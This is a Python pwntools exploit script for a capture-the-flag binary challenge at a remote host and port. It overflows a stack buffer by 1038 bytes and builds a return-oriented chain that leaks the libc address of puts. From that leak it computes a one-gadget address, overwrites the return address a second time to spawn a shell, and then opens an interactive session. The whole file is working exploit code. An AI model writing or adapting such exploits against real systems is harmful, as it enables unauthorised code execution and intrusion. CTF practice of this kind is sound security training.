from pwn import *

context(terminal=['tmux','new-window'])


fname = './chall'

local = False

host,port = 'challs.htsp.ro', 8001

r = process(fname) if local else remote(host,port)

prog = ELF(fname)
libc = prog.libc if local else ELF('./libc-2.27.so')

pop_rdi_ret = 0x00000000004008f3

magic_offset = 0xe3b34 if local else 0x10a2fc

def send_done():
	r.sendline(b'done')

def send_buf(v):
	r.sendline(v)

def leak_libc_puts():
	a = r.recvline()
	a = u64(a[:6]+b'\x00'*2)
	print(hex(a))
	return a

if __name__=='__main__':
	print(r.recvuntil('/dev/null'))
	
	if local:
		gdb.attach(r,'''
			b *0x0000000000400885
			c
		''')
	send_buf(b'a'*1000+b'b'*38+p64(pop_rdi_ret)+p64(prog.got['puts'])+p64(prog.plt['puts'])+p64(prog.start))
	send_done()
	r.recvline()
	resolved_puts = leak_libc_puts()
	base_addr = resolved_puts-libc.sym['puts']
	magic = base_addr+magic_offset
	
	print(r.recvuntil('/dev/null'))
	send_buf(b'a'*1000+b'b'*38+p64(magic))
	send_done()

	r.interactive()	
